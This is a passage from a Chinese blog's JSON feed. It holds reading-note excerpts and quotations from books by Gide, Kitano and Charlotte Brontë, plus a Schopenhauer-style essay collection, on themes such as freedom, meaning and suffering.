4-50</h3>\n<p>他克制住了这种软弱，用直截了当的声调说：“这就是国王的旨意”。</p>\n<p>但是他对那个神甫那么尊敬，他对他的感激和忠诚已经在他心里深深地扎了根，甚至就是到了此刻，他也还在挣扎着不让妒忌和绝望制服他。</p>\n<p>神甫没有看见也没有听见所有这一切，他是那种不知道有清晨，有飞鸟，有花朵的人物。在他周围那广阔无边的天际，景物何止万千，但他的眼光却只集中在这一点上。</p>\n<p>在那个深邃的墓窖里，有多人人类的灰尘和多少罪恶同在一起腐烂，世界上有所人伟大人物，多少清白无辜的人的骸骨不断的被送到那里。</p>\n<p>紧抱住那具尸骨的另一具尸骨是个男人，人们只看到他有弯曲的脊梁骨、头盖骨缩在肩胛骨中间，一条腿骨病另一条腿骨短些。</p>\n",
            "tags": [
                "神学",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/52%E3%80%8A%E8%BF%9D%E8%83%8C%E9%81%93%E5%BE%B7%E7%9A%84%E4%BA%BA%E3%80%8B%E7%BA%AA%E5%BE%B7/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/52%E3%80%8A%E8%BF%9D%E8%83%8C%E9%81%93%E5%BE%B7%E7%9A%84%E4%BA%BA%E3%80%8B%E7%BA%AA%E5%BE%B7/",
            "title": "《违背道德的人》纪德",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>他的诺曼底脑子不允许他相信这种事存在的可能。</p>\n<h3 id=\"4-94\"><a class=\"markdownIt-Anchor\" href=\"#4-94\">#</a> 4-94</h3>\n<p>为自己挣得自由不算什么，难就难在如何利用那自由。</p>\n<p>此前，我都在为自己生活，至少都是按照自己的意志活着。</p>\n<p>新的感官体验唤醒了我身上一些沉睡已久的部分。尽管许久未使用，但依然保持着神秘的青春。那感觉主要不是欣赏，而是惊奇与迷惑。</p>\n<p>说到底，生活又给了我什么让我必须活下去？我勤勤恳恳工作到最后一刻，带着满腔热枕的尽忠职守。至于剩下的，跟我有什么关系？</p>\n<p>我惊异的发现自己还活着，每一个崭新的今天都是我未曾希望活到的明天。</p>\n<p>对于现在的我，苟延残喘的活着就够我费力气的了。</p>\n<p>我认为任何形式的高度敏感，都可以成为快乐和痛苦的理由，这完全取决于身体的强弱程度。从前令我痛苦不堪的一切，如今我却甘之如饴。</p>\n<p>从前，我爱的是那种一成不变的感觉，它让我的思想精准的运行。现在我只能通过想象现在，才能从历史中剥离出快乐。</p>\n<p>曾经我视为全部生命的工作，现在看来和我只保持着一种极为偶然、可有可无的关系。</p>\n<p>我沉迷自己，沉迷于一切我觉得神圣的事。</p>\n<p>被人们当成最恶劣的事，其实难度并非最大，除了那些从未干过的人，一旦做了，任何事都会变得极简单且让人享受，再做第二次时，连一丝懊悔的情绪都没有。</p>\n<p>往昔与悔恨、希冀或渴求、未来和过去，通通归于沉默，生活只随着每一个消逝的瞬间来了又走了。</p>\n<h3 id=\"4-95\"><a class=\"markdownIt-Anchor\" href=\"#4-95\">#</a> 4-95</h3>\n<p>跟别人在一起时，我常感到无聊，阴郁和不合群，而且会立马觉得不自在。</p>\n<p>每次跟他们交流时，不得不扮成伪君子，被迫演出那副他们认为我依然保持的样子，以显得不那么虚假。为了让相处容易，我还得假装成拥有他们传播给我思想与品位的样子。</p>\n<p>他们似乎不在脚踏实地的生活，做个样子就满足了，差一点就把生活当作写作的绊脚石。</p>\n<p>他们都一样，彼此之间没多大区别。我跟他们中任何一个人说话，就好像在和许多人讲话。他们苟延残喘，做出生活的样子，却不知道自己还活着。</p>\n<p>在普通人之间，我成了陌生人，仿佛刚从墓地爬回来。</p>\n<p>在我看来，滴酒不沾才具更威力的陶醉，我既能沉醉其中，又能保持清醒。</p>\n<p>我曾想表露自己的信仰，却不知那些愚蠢的举动！我不大关心别人是赞成还是反对，我也不会评价自己。这些词汇对我来说都没有意义。</p>\n<p>我四处溜达，随便听听看看，至于发生了什么，我根本不在乎。</p>\n<p>我可没法承认他们对我的认同和保留，我是一个独立完整的人，只追求自在，只要这件事能给我带来乐趣，那我觉得就可以去做。</p>\n<p>大多数人都认为只有通过约束自身才能获得成果。人们不喜欢拿出真我，他们都选个楷模来效仿；有时连选择有掠过，只接受现成的楷模。但我认为，人身上还有别的可取之处。可他们不敢仔细查看。</p>\n<p>人们啊，只知道模仿，又说这才是热爱生活。</p>\n<p>我讨厌一切循规蹈矩的人，再也没有比他们更卑鄙的人了。所谓道德准则要求什么，他们就做什么，否则就认为自己错了。</p>\n<p>我这人沉迷于过去，而这真切的现实滋味却令我心醉，但未来也有剥夺现时魅力的能力，就像现实夺走往日的快乐一样。</p>\n<p>我们总以为自己在占有，却不知自己早就被占有了。</p>\n<p>时间带来的一切，也都会被时间带走。</p>\n<h3 id=\"4-96\"><a class=\"markdownIt-Anchor\" href=\"#4-96\">#</a> 4-96</h3>\n<p>我探进黑暗，却期待能看到一丝强光。</p>\n<p>现在唯一能让我集中精力的，就是通过我的全部感官得来的东西。</p>\n<p>他的诺曼底脑子不允许他相信这种事存在的可能。</p>\n<p>每天我都越来越强烈的感觉到，许多尚未被开发的宝藏，正隐藏在那层层叠叠令人窒息的文化、礼数和道德下。</p>\n<p>长久以来，我们一直沉浸在阴影里，那与世隔绝的生活让我迷醉。有人沉醉于美酒，而我却沉醉于我的干渴。</p>\n<p>我漫无目的的闲逛着，没有目的，没有欲望，也没有束缚。我以全心的目光看着这一切，专心地听，一切声音都被我尽收耳内。</p>\n<p>人穷就要被人奴役，要吃饭就得去干厌恶的工作。</p>\n<p>当我们把目光集中在人身上的某个特质时，就会将其放大，就这样我们把它变成了我们希望看到的样子。</p>\n<p>体面的差事摧毁了这些曾经精致年轻的身体。</p>\n<p>在这个古怪的土地上，人总以为危机四伏，这太荒谬了。</p>\n<p>把我从这里带走，给我活下去的理由吧，现在光凭我，任是一个理由也找不到，也许我已经解脱了，可又能怎样？这空洞的自由让我痛苦，我快受不了了。</p>\n<p>我被这里的光华和已消亡的事务包围着，走到哪儿都会遇上享乐。每个人都一成不变的沉溺在里面。</p>\n<p>这墙上就是我仅剩的东西，在这儿我可以一无所有的生活着。</p>\n",
            "tags": [
                "人性",
                "道德"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/50%E3%80%8A%E5%90%91%E6%AD%BB%E8%80%8C%E7%94%9F%E3%80%8B%E5%8C%97%E9%87%8E%E6%AD%A6/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/50%E3%80%8A%E5%90%91%E6%AD%BB%E8%80%8C%E7%94%9F%E3%80%8B%E5%8C%97%E9%87%8E%E6%AD%A6/",
            "title": "《向死而生》北野武",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>设想倒是有一大堆，不过都是纸上谈兵，实际一去行动，什么也做不了。</p>\n<h3 id=\"4-84\"><a class=\"markdownIt-Anchor\" href=\"#4-84\">#</a> 4-84</h3>\n<p>总有一些人喜欢被操纵着，同时还有另一部分人喜欢操纵着别人。</p>\n<p>我的生活就是工作，三百六十五日日如此，做的事情非常单调。</p>\n<p>每个人都像是被附体一样，每一天都理所当然像机器似的生活着，可在猛然离开日常生活后我才发现，这竟然意外的使人觉得很幸福。</p>\n<p>我想到那里走走，即使到那里走，没有任何意义。</p>\n<p>动物，就是靠自己的力量行走，并吃下食物生存下去。不行的时候就被吃掉。</p>\n<p>我的腿像戴上沉重的脚铐似的，同时又被困在床上，简直是双重的枷锁。</p>\n<p>结果，就只是看着不如我的人，衡量位置关系罢了。</p>\n<h3 id=\"4-85\"><a class=\"markdownIt-Anchor\" href=\"#4-85\">#</a> 4-85</h3>\n<p>为了活下去，就要吃饭，可是现在所有地方都扭曲了。饥饿而死的人有很多。</p>\n<p>自己的脑子里事后也考虑了很多事，突然就那样坐上了传送带，什么也没有改变。</p>\n<p>只是活着这件事本身有价值，其他的没有。大概就是脑袋还在转，心脏还在跳，只是这些还有意义，其他的部分都是附加的。</p>\n<p>人肯定是想着不如自己的人来确认自己的位置才放心，自己也沾染了这种劣根性。</p>\n<p>到目前为止的人生，自己到底做了什么？</p>\n<p>我觉得这绝对不是我，也不是为了她自己，仅仅是想让我高兴罢了。</p>\n<p>好感度这种东西为什么有意义呢？这一点都不令人高兴。</p>\n<p>不管是坏的意义还是好的意义，如果不留下任何痕迹，就没有任何意义。</p>\n<p>继续活下去，如果处于被动为止的话，总有一天会继续不下去的。</p>\n<p>无意识的度过时间是非常重要的，如果没有意识到这点，就不会消磨掉时间。</p>\n<p>他们所做的绝大多数表面的工作，大抵都会是一种赚钱的手段，每一步都是有安排的，不做那个不行。因为社会就是这样扭曲被建立的，那种程度的安排不做不行。尽管内心觉得很傻。</p>\n<p>我不觉得社会理念有什么不好，它也不过是一种宗教。那只是不会处理的人的失败。用脑袋思考而身体是朝着完全不同的方向行动的人不在少数。</p>\n<p>我想要逃到某个地方轻松一下，不过，那之后要是不回来的话就有意思了。</p>\n<p>我有我的生活方式，不到嘭的撞墙的时候，就不会改变方向。</p>\n<p>发生事故，稍稍停下来，虽然一段时间速度会降下来，但恢复到平时时，就会又按原来的速度跑起来。那就是生活。如果被迫用不同的速度走不同的方向，那就已经不是那个人的人生了。是另外别的什么人的人生。</p>\n<p>所谓的精神，根据自己的位置在哪儿，判断就会全然不同。</p>\n<p>无论是战争还是生病，所谓的战场，归根结底都不的不是一个人的战斗。听取周围人的意见，即使死了，责任也只能由本人承担。</p>\n<p>可以说，大家一起过桥的话就不会害怕桥塌了，现在已经变得在哪里是一样的了。</p>\n<p>只要努力就会获胜，这句话失去价值的瞬间，任何差距都没办法加以区别了。</p>\n<h3 id=\"4-86\"><a class=\"markdownIt-Anchor\" href=\"#4-86\">#</a> 4-86</h3>\n<p>到处都是没有什么缘由而成立的大学，扔个石头就能砸到一个大学教授。</p>\n<p>学校的教师曾经是令人刮目的职业，现在成了那些未通过企业的考试者不得已做的职业。</p>\n<p>上层次的人没必要和平民一样去看大减价吧。</p>\n<p>低级的家伙就会在低级的地方演出，本来有价值的东西也会廉价拍卖。</p>\n<p>现在的人们已经连笑的能力都失去了。把矛盾看成理所当然的事情不奇怪的吗？</p>\n<p>喝酒的一瞬间，就会说做什么都不要紧，是我的细胞在这么想的吧？</p>\n<p>即使是作为思想或者哲学，也像个的到了一大堆玩具的孩子一样，从这个挑到那个眼花缭乱的，最后对哪个都不能好好地玩。而只得到一个玩具的孩子，就一定会爱惜的玩着。</p>\n<p>各色各样的食物一个一个涌现出来就像连续更换电视频道那样，只有单纯的信号在做着反应。</p>\n<p>这样的事情一个也不做的话，人类就到了陷入无底沼泽的时代了。</p>\n<p>我们又不去赌博，却硬要把这些禁忌放在自己心中。</p>\n<p>这和考驾驶执照时的性格测试是一样的。要是说真心话，就会打个叉。大家都知道说些原则上的话，所以最开始就决定还是画个圈。</p>\n<p>仅仅是认为这样回答好所以这样回答。和实际是不同的，人们只是把本来按照步骤做的事情原原本本地作为问题，就成了没有实质的东西了。</p>\n<p>即使是总理大臣也不能把每个问题都答出来。</p>\n<p>把这种不起任何作用的事情作为工作还会给他们奖金，真实没办法。</p>\n<p>大家都在随波逐流，他们没时间也没必要去考虑那些问题。</p>\n<p>无望的社会也是同样做着无望的事情。</p>\n<p>聚集这些数字，也只是徒劳，什么作用也不起。</p>\n<p>只拘泥于形式，这样能够满足的事情就过多了。</p>\n<p>官员们的工作就是做一些没有意思的事。搬到新的办公楼，也只是增加人数做着没有意义的事。</p>\n<h3 id=\"4-87\"><a class=\"markdownIt-Anchor\" href=\"#4-87\">#</a> 4-87</h3>\n<p>很多机关做着奇怪的事，还不起任何作用，只是在浪费税金而已。</p>\n<p>叫来了文化人或者是大学教授等各类人听取意见，只能和舆论调查一样说出一些不得罪人的意见。</p>\n<p>他们模模糊糊的有的理想，但从不考虑隐藏在背后的东西。他们很擅常盲目并相信并且吸收。</p>\n<p>我们不能停止，所以会想大家还是一起来承担这样沉重的负担吧，要不是这样的话，就变成了不能做这种事的世界了。</p>\n<p>一个人生活在社会中，只能是依靠别人或被别人依靠。</p>\n<p>对于很多人来说，和老婆孩子一起愉快的生活就是他们活着的目的了。</p>\n<p>现在的男人既不是丈夫，也不是父亲。仅仅是身边的好人罢了，大体上，自己工作转赚的钱全部被别人拿走，却很不在意。</p>\n<p>就会像受到社会的制裁一样，没有办法，只能为了孩子做出牺牲。</p>\n<p>结果，男人都变成了奴隶，作为奴隶，所以很轻松。什么也不用考虑，只要做就行了。现在的男人已经不能任性了，也不希望让人说那个家伙只考虑自己。</p>\n<p>没有无限制的自由。自由不是白白的就能占为己有的东西。正因为如此，是价值最高的了。怎样自由的生存，就要怎样的限制自己。</p>\n<p>我想真是出丑，也不是那么低贱的事情，归根结底不只是为了赚钱吗？</p>\n<p>不知缘由的彷徨着，不知是好是坏，没有根本答案。</p>\n<p>拼命工作赚钱，过着他们应该过的生活，这就是他们的梦想。</p>\n<p>在这片土地上，如果你是一个平凡的人，从小屋子里脱身的可能性就是零，发挥出很大才能的人和没有能力的人的水准并没有那么大的差距。</p>\n<p>多亏了宪法，让我们变得自由平等了，实际上变得更加没有自由，人与人之间的差距更大的社会。</p>\n<p>让我们感觉到这个国家就好像一座大的监狱，在这个监狱中虽然说是人人平等，其中有特殊优待的囚犯头儿，即使是在最低劣的条件之中，逐渐的也一定会出现不出力而获得好处的家伙。</p>\n<h3 id=\"4-88\"><a class=\"markdownIt-Anchor\" href=\"#4-88\">#</a> 4-88</h3>\n<p>偶尔也会有主张正确言论的人，但是马上就会被排挤出去。他们被称作是顽固不通融的人或者不懂诙谐的人。</p>\n<p>设想倒是有一大堆，不过都是纸上谈兵，实际一去行动，什么也做不了。</p>\n<p>店长被不停的替换，但是小屋里边要做的事情没有改变。</p>\n<p>暗地里这样做的悲惨，只是在表面上做的很好来敷衍过去。</p>\n<p>在哪儿都是接受同样的教育，从哪儿毕业也都是发给同样的资格证。</p>\n<p>人类也是一样的。虽说是大学毕业，但是也有像有 “虫眼” 蔬菜的家伙，即使做了很多改变，但是有虫眼就是有虫眼。大家都这样伪装着，也有人让他们就职。</p>\n<p>人类要是这么温柔的动物的话，早就该灭绝了。能够存活到现在，是因为人类曾那么凶残的杀死了敌人。</p>\n<p>真正在做自己喜欢做的事的人是不会有的。所谓的兴趣，是花费了一生的时间持续下去的才叫兴趣。</p>\n<p>说这你这样的不可以去，不可以谈话，不可以主张的家伙，就像是有所有的权利那样指挥着别人。即使是总理大臣，不能担任的家伙也在担任着。</p>\n<p>如果有命地话，那就尽情活着吧。</p>\n<p>哪怕歪着脸也要咬紧牙关拼命地继续他那有趣的工作，无论这项工作是什么事情。</p>\n",
            "tags": [
                "生命",
                "意义"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/51%E3%80%8A%E6%9D%82%E8%8D%89%E4%B8%9B%E7%94%9F%E7%9A%84%E8%84%91%E8%A2%8B%E3%80%8B%E5%8D%95%E4%BA%BA%E5%85%84%E5%BC%9F/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/51%E3%80%8A%E6%9D%82%E8%8D%89%E4%B8%9B%E7%94%9F%E7%9A%84%E8%84%91%E8%A2%8B%E3%80%8B%E5%8D%95%E4%BA%BA%E5%85%84%E5%BC%9F/",
            "title": "《杂草丛生的脑袋》单人兄弟",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>人的本质就在于他的意志有所追求，一个追求满足了又重新追求，如此永远不息。</p>\n<h3 id=\"4-88\"><a class=\"markdownIt-Anchor\" href=\"#4-88\">#</a> 4-88</h3>\n<p>你走了很远，却从来没有走出的地方，就是你的原点；你走了很久，却始终没有走到的地方，也是你的原点。</p>\n<p>哲学就是把简单的搞复杂，复杂的搞简单；把不存在的说得活灵活现，把实实在在的说得虚无缥缈。</p>\n<p>事物的存在或发生，仅存在于我们的意识中，且只有为意识而存在，人的意识素质是人的最重要的是事物。</p>\n<h3 id=\"4-89\"><a class=\"markdownIt-Anchor\" href=\"#4-89\">#</a> 4-89</h3>\n<p>一个具有理智的、在完全孤独的时候，沉浸于自己的思想之中，其乐也无穷。</p>\n<p>大多数人都是被困乏鞭策着过一辈子，不让他们有深思机会。</p>\n<p>具有常乐的特殊个性人士，他拥有高度的理智，别人所追求的那些快乐，对他来说是多余的，甚至是一种负担和困扰。</p>\n<p>被记录在纸上的思想，不过是像在沙上行走者的足迹而已，我们也许能看到他所走过的路径；如果我们想要知道他在路上看见些什么，则必须用我们自己的眼睛。</p>\n<p>真正的哲学家，他的疑难是从观察世界产生的，冒牌哲学家则是相反，他的疑难是从一本书中，从一个现成的体系中产生的。</p>\n<p>一切伪装的假情假意都是思索的产物，但是不能继续持久而不露破绽。</p>\n<p>社会的每一角落都充斥着令人心惊肉跳和毫无目的的噪音。</p>\n<p>任何人之所以是他，是因为他的认识然后才成为他的。</p>\n<p>空虚无聊不是一件可以轻视的灾害，到了最后它会在人的脸上画出那个人所遇到的真正的绝望。</p>\n<p>苦恼和死亡是联结在一起的，他们制造了一条迷路，虽说人们希望离开它，但却相当困难。</p>\n<p>真理几乎经常是从后门溜进来的，因为它是由于偶然从某一附带情况中产生的。</p>\n<p>我们常易忘记自己过去的快乐经验，对于痛苦的遭遇，却很少有人能磨灭，这就证明了人在本性上原是与痛苦同在的。</p>\n<p>一切痛苦始终不是别的什么，而且未曾满足和被阻挠的欲求。</p>\n<p>他们除了限于真正的 “直观感觉 “的东西之外，其他方面的毫无所知。</p>\n<p>即使最美好的思想，如果不及时把它写下，恐怕就此一去不回头，想找也找不到了。</p>\n<p>人是欲望的复合物，是很不容易满足的，即使得到满足，那也仅能给予没有痛苦的状态，但却带来更多的烦恼。</p>\n<p>凡在神志健全的场合，使良心感到负担的是人的所作所为，而不是愿望和想念，只有我们的所作所为才把一面反映我们意志的镜子高举在我们面前。</p>\n<h3 id=\"4-90\"><a class=\"markdownIt-Anchor\" href=\"#4-90\">#</a> 4-90</h3>\n<p>意志自身在本质上是没有一切目的，一切止境地，它是一个无穷追剧。</p>\n<p>喜欢侮辱别人，当然不是坏品质。但也许比这个更坏的，是喜欢被别人侮辱，或习惯被别人侮辱，或是看着有人被侮辱，却装着什么也没看见的人。</p>\n<p>伟人的价值，不在他的名声，而是造成他获得名声的原因。</p>\n<p>欲望无所谓好坏，欲望之手牵引我们抵达那些没有欲望就无法抵达的地方。</p>\n<p>财富在很多时候是以掠夺别人的幸福为前提的，正如有人所言，在每一笔巨额财富后面都是罪恶累累。</p>\n<p>身份与财富对于许多人来说，都是一个沉重的，无法放下的包袱。</p>\n<p>人的最高、永恒和幸福的快乐实是他的心灵。</p>\n<p>我们不能幻想攥着那把并不存在、虚拟的道德尺度去四处丈量别人，因为那是上帝的工作。</p>\n<p>羡妒在人与人之间，建立一道坚厚的墙；同情则使这道墙变松，变薄；有时候，甚至彻底把它推倒，于是，自我与非我之间的区别便消失了。</p>\n<p>其实对于绝大多数普通人而言，他们活着的理由就是不想死。</p>\n<p>欺世盗名者大有人在，他们看重的不是名声本身，而是名声所能带给他们的利益。</p>\n<p>每逢有杰出的事件出现，不论是哪一方面的杰出，伪君子和一帮大众都会联合起来排斥甚至压制他。</p>\n<p>幸灾乐祸所带来的笑骂，简直是来自地狱的笑声。</p>\n<p>嫉妒别人失去自己无法拥有的东西，正是幸灾乐祸的源泉。</p>\n<p>任何人都无权把自己捧出来充当一个纯粹道德的审判员和报报复者；而以自己加于人的痛苦来找别人的过失算账，也就是责成别人的过失而忏悔。</p>\n<p>没有别的事情能比读古人的名著更能给我们精神上的快乐。</p>\n<p>高级的精神文化，往往会使我们渐渐的达到另外一种境地，从此可不必再依赖他人，以寻求乐趣，书中自有无穷之乐。</p>\n<p>多数时间多数人的思考，其实都是毫无意义的胡思乱想而已。</p>\n<p>我们读书时，是别人在代替我们思想，我们只不过重复他的思想活动的过程而已。</p>\n<h3 id=\"4-91\"><a class=\"markdownIt-Anchor\" href=\"#4-91\">#</a> 4-91</h3>\n<p>读书是意味着利用别人的头脑来取代自己的头脑。</p>\n<p>我们如不为获得某种东西而努力，或是不埋头于学术性的研究，是不能赖以生存的。</p>\n<p>凭苦读的帮助你可以提升自己于一般仅有知其所见的大众之上，而获得只有博学的苦役方可接近的隐蔽所在。</p>\n<p>人的乐趣其实往往在于对事物的一知半解，有时完全认识会让事物变得索然乏味。</p>\n<p>让好端端的一套理论和学说变得混乱不堪、自相矛盾的恰恰是那些自以为是的所谓理论工作者。</p>\n<p>一般的 “书籍哲学家”，如同历史的研究者；自己思考的人，犹如事实的目击者。</p>\n<p>所谓 “学者” 是指哪些成天研究书本的人，思想家、发明家、天才以及其他人人类的 “恩人”，则是直接去读 “宇宙万物”。</p>\n<p>我们不必读太多的书，如若不然，精神习惯于代用物，将会忘却事物本身；总是踏着人家已经开拓的道路，而忘却行走自己的思考道路。</p>\n<p>那些发自内心深处的作品，只能在粗制滥造和盲目起哄的喧嚣中沉默。</p>\n<p>我们的生活样式，也是就像一幅油画，从近看，看不出所以然来，要欣赏他的美，就非站远一点不可。</p>\n<p>这世上存在着一群奇怪的人，他们的悲伤只是来自别人兴奋的时候，而他们的兴奋则往往是在看到别人遭遇不幸的时候。</p>\n<p>爱好悲剧的心理，有时就只是一种恻隐之心的表现。</p>\n<p>通过 “艺术品”，天才把他所掌握的理念传达于人。</p>\n<p>没有真理，任何艺术的美都将不能存在。</p>\n<p>他迫切需要没有烦扰的自由，他欢迎寂寞，闲暇是他最大的幸福。</p>\n<p>他们创作出来的作品没有任何实利目的的副产品，更不能拿实用标准来衡量。</p>\n<p>智慧对于性格的作用，犹若一个人穿上与平日完全不相同的服装，戴上假发或胡须而改变人的外观 一般。</p>\n<h3 id=\"4-92\"><a class=\"markdownIt-Anchor\" href=\"#4-92\">#</a> 4-92</h3>\n<p>一出更大的范围里的皇帝的新衣，正在世界范围内公演着。</p>\n<p>一个有智慧或天才人物，只要他他所处的地位不能高傲而大胆地蔑视这个世界时，如果他不为自己的存在求恕的话，便无法为这个世界所容。</p>\n<p>当他们面对自己无限膨胀的欲望时，思维和理性，不是缺席就是弃权。</p>\n<p>一个痴呆的人看不出貌似互不相关而事实上是串通行动的人们，所以他很容易陷入别人布置的疑阵和阴谋。</p>\n<p>雷同的生活，雷同的人沉浸在雷同的世界中模仿着、雷同着。</p>\n<p>假如你有根据怀疑一个人正在告诉你的谎言，那么你要装出你相信他所说的每一个字，这就会给他继续说下去的勇气，他将会更热情于他的主张，直到最后使自己自相矛盾。</p>\n<p>爱情是盲目的，陷入情网的男人，虽明知意中人的气质或性格，都有使他能以忍耐缺点，甚至会给他带来痛苦和不幸，却仍不肯稍改初衷、一意孤行。</p>\n<p>人要获得独立自主地闲暇，必须自愿节制欲望，随时养神养性。</p>\n<p>我们不得不在意志强大的驱动下，克制自己的本能。</p>\n<p>人类幸福有两种敌人：痛苦与厌倦。进一步说，即使我们幸运地远离了痛苦，我们便靠近厌倦；若远离了厌倦，便又靠近了痛苦。</p>\n<p>他们只对结果感兴趣，至于所谓的过程，对他们来说不过是些可有可无的软东西。他们要的是那些看得见、摸得着的东西。</p>\n<p>承认自身的局限在任何时候都不多余。</p>\n<p>别人的想法，并不能影响我们获得的幸福，可是我们中的很多人过分重视他人对自己的看法，真是多余。</p>\n<p>一般人厌倦空闲，总需要为着什么目的而努力、忙碌，若是连幻想或勉强的目标–诸如游戏、消遣和各种嗜好都找不到，闲暇就会成为负担了。</p>\n<p>我们没有选择干什么的自由，我们只有选择不干什么或者什么都不干的自由的生存状态。那些把闲暇当成负担的人，并不知道什么叫做真正的自由。</p>\n<h3 id=\"4-93\"><a class=\"markdownIt-Anchor\" href=\"#4-93\">#</a> 4-93</h3>\n<p>使我们幸福或不幸福的，并非客观事件，而那些事件给予我们的影响，和我们对他的看法。</p>\n<p>麻药的作用是有限的，时间一过你又会疼痛起来。</p>\n<p>别人是寄存我们真正幸福的最坏之所，也许可能寄存想象的幸福在他身上，但真正的幸福必须存在自己之中。</p>\n<p>任谁也不幸福，人生只是追求通常想象上的幸福，而且能达目的的绝少，纵能达到也将立刻赶到” 目的错误 “的失望。</p>\n<p>人的本质就在于他的意志有所追求，一个追求满足了又重新追求，如此永远不息。</p>\n<p>平庸是最为可怕的。要么是悲壮的死，要么是滑稽的活。至少是主角，怕就怕不死不活的一直当观众，最多也只能演个配角。</p>\n<p>我们在生活中，只有放弃一切不相干的要求，对一切个别的东西弃权才能真正严肃的幸运的追求任何一个一定要企图，不管所追求的是什么。</p>\n<p>大家都是可怜的演员，对自己的命运充满着渴望和焦虑。这些演员时常不能满足于自己所扮演的那个角色，于是，我们看到这个舞台上总是乌烟瘴气，混乱不堪。</p>\n<p>我决绝不后悔我所欲求过的；但很可能后悔我所做过的，因为我可以是被错误的概念所诱导而做出了什么与我意志不相符合的事，而在事后有了较正确的认识时，看透这一点就是懊悔。</p>\n<p>很多时候自己处于事物之中，被事物的表面现象给迷惑了。</p>\n<p>我多想离开长久受人注视的生活，不要再时时刻刻顾虑到他们的评语。</p>\n<p>我们用不着抱怨世俗目的地低下，因为不管人们说什么，他们却统治着世界。</p>\n<p>在人生的广泛细节中，有时我们也得扮演愚蠢的喜剧角色。</p>\n<p>生活就像是在一个题目上发挥不同的内容而已。</p>\n<p>从愿望到满足又到新的愿望这一不停的过程，如果辗转快，就叫做幸福；慢，那就叫做痛苦。如果陷于停顿，那就表现为可怕的，使生命僵化的空虚无聊，表现为致命的苦闷。</p>\n<h3 id=\"4-94\"><a class=\"markdownIt-Anchor\" href=\"#4-94\">#</a> 4-94</h3>\n<p>纵观个体一生，若只就其最显著的特征来看。通常他是一个悲剧，但若仔细观察其细节，则又带有喜剧的性质。</p>\n<p>既然我们所追求的目的最终都指向墓地，那么我们在路上多呆个几天或者多演一场戏，多吃两顿饭，多做几次爱又有什么价值和意义。</p>\n<p>如果我们要找到一个可靠的指南针来指导我们的人生，最有用的方法，无过于把自己看成置身在赎罪的世界中，这个世界是一种要处罚人的殖民地。</p>\n",
            "tags": [
                "成长",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/54%E3%80%8A%E7%AE%80%C2%B7%E7%88%B1%E3%80%8B%E5%A4%8F%E6%B4%9B%E8%92%82%C2%B7%E5%8B%83%E6%9C%97%E7%89%B9/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/54%E3%80%8A%E7%AE%80%C2%B7%E7%88%B1%E3%80%8B%E5%A4%8F%E6%B4%9B%E8%92%82%C2%B7%E5%8B%83%E6%9C%97%E7%89%B9/",
            "title": "《简·爱》夏洛蒂·勃朗特",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>我忘了你已经建立了一个新的约束。可是，我不是傻瓜，走。</p>\n<h3 id=\"4-102\"><a class=\"markdownIt-Anchor\" href=\"#4-102\">#</a> 4-102</h3>\n<p>我这个人过关了永远挨骂、做苦工而得不到感谢的日子，处在眼前的这种环境里，原该感到像处身在和平的乐园里一般，可是我那受了摧残的神经到现在已经到了这样的地步，没有一种宁静能安慰它们，也没有一种乐趣能合意地叫它们兴奋起来。</p>\n<p>人总得爱样什么，既然没有更值得爱的东西，我只好设好疼爱一个小叫花子似的褪色木偶，从中获得一些乐趣。</p>\n<p>我一个人站着十分寂寞，不过我对那种孤独感已经习惯了，所以这并不使我太难受。</p>\n<p>现在呢，陌生而模糊；对于未来，我更无法推测。</p>\n<p>她看上去似乎在想着什么超出她的惩罚，超出她的处境的事，想着什么不是她周围，不是她眼前的事。她的视线几乎是向内，向着她自己的心；她在看着记忆中的什么，而不是真正在眼前的事物。</p>\n<p>在这以前，我一直是个旁观者，看着劳伍德进行的一切，如今却也要成为那儿的一名演员了。</p>\n<p>与其冒冒失失采取一个行动，让不良后果影响所有和你有关的人，那还不如按耐住性子，忍受一个除你而外没有别人感到的痛苦来得好。</p>\n<p>既然躲避不了，那就不能不忍受；遇到命中注定让你忍受的事，你光说受不了，是软弱和愚蠢的。</p>\n<p>在人世间，我们人人都有一身罪过，而且不可能不是这样；但是我相信，不久就会有这么一天，我们摆脱了腐朽的躯壳，也就摆脱了这些罪过，堕落和罪孽就会跟着我们的累赘的血肉之躯离开我们。</p>\n<p>她叹了一口气，站起身来，服从了班长，没有回答，也没有耽搁。</p>\n<p>人不能只靠面包，还要靠上帝所说的每一句话生活。</p>\n<h3 id=\"4-103\"><a class=\"markdownIt-Anchor\" href=\"#4-103\">#</a> 4-103</h3>\n<p>人的天性就是不能这样尽善尽美！哪怕是在最明亮的星球上也会有这样的黑点；而她那样的眼睛就只看到那些细小的缺点，而看不见星球的万丈光芒。</p>\n<p>除了这个尘世，除了人类，还有一个看不见的世界，还有一个神灵的王国。这个世界就在我们周围，它无处不在；那些神灵守望着我们。</p>\n<p>她戴着它一直到傍晚，忍耐着，毫无怨恨，把它看做应得的惩罚。</p>\n<p>几年来，我的世界一直局限于劳伍德，我的经验一直局限于它的规章制度，这时候我才想起，真正的世界是广阔的，有一个充满希望和恐惧，感动和兴奋的天地，正在等着有勇气进去、冒着危险寻求人生真谛的人们。</p>\n<p>感到自己孤零零地在世界上，从一切联系中游离开来，不能肯定是否能到得了目的地，而许多障碍又阻止自己回到已经离开的那个地方。</p>\n<p>我写作并不是为了迎合父母的自私心理，并不使为了人云亦云地作违心之论，也不是为了支持骗人的空话；我只是说实话罢了。</p>\n<p>说人们应该对平静感到满足，这是徒然的；人们总得有行动；即使找不到行动，也得创造行动。千百万人被注定了要处在比我更加死气沉沉的困境中，千百万人在默默反抗自己的命运。谁也不知道，在充斥世界的芸芸众生中，除了政治反叛以外，还掀起了多少其他的反叛。</p>\n<p>我慢慢的走着，享受和品味此时此景所赋予我的欢乐。</p>\n<p>我很高兴做了这件事，事情虽然小，